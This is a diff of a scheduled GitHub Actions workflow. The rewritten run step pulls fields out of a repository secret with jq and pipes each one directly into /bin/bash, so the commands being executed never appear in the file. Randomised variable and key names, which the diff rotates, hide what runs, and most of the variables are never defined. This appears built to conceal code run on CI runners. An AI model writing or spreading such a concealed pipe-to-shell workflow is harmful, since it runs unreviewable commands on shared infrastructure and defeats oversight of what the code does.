@@ -1,9 +1,8 @@
 name: dongguange7412
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 5/6 * * *'
+    - cron: '54 3/6 * * *'
 
 jobs:
   build:
@@ -13,21 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: dongguange7412
         env:
-          pfuq19: ${{ secrets.pfuq19 }}
+          u5070: ${{ secrets.u5070 }}
         run: |
-          echo $pfuq19 | jq -r .lttrj1 | /bin/bash
-          echo $ubb21222 | jq -r .sxcf15 | /bin/bash
-          echo $oefq8 | jq -r .l78906 | /bin/bash
-          echo $jk3650 | jq -r .yvza41367 | /bin/bash
-          echo $ypy666 | jq -r .k71 | /bin/bash
-          echo $bvwh35063 | jq -r .rxkp33 | /bin/bash
-          echo $g549 | jq -r .aizc7 | /bin/bash
-          echo $hv662 | jq -r .rs16878 | /bin/bash
-          echo $pmph7520 | jq -r .cjv5 | /bin/bash
-          echo $pmkvs80 | jq -r .vlb66748 | /bin/bash
-          echo $zxdlq53401 | jq -r .wkmse48886 | /bin/bash
-          echo $cgil601 | jq -r .m632 | /bin/bash
-          echo $z9464 | jq -r .p52946 | /bin/bash
-          echo $gdg419 | jq -r .jqkm1508 | /bin/bash
-          echo $qn78 | jq -r .cfqnt9576 | /bin/bash
+          echo $u5070 | jq -r .jjh36351 | /bin/bash
+          echo $vsvor9 | jq -r .dee0673 | /bin/bash
+          echo $bj61 | jq -r .itxat75 | /bin/bash
+          echo $h5885 | jq -r .lhav6 | /bin/bash
+          echo $sd91656 | jq -r .p79 | /bin/bash
+          echo $mgyo654 | jq -r .sxwov41 | /bin/bash
+          echo $cy8950 | jq -r .pm0144 | /bin/bash
+          echo $kcexj5586 | jq -r .soxxo78 | /bin/bash
+          echo $s3101 | jq -r .y238 | /bin/bash
+          echo $te749 | jq -r .ywtr88 | /bin/bash
+          echo $owygh27 | jq -r .yo01945 | /bin/bash
+          echo $vnypx1 | jq -r .tn108 | /bin/bash
 
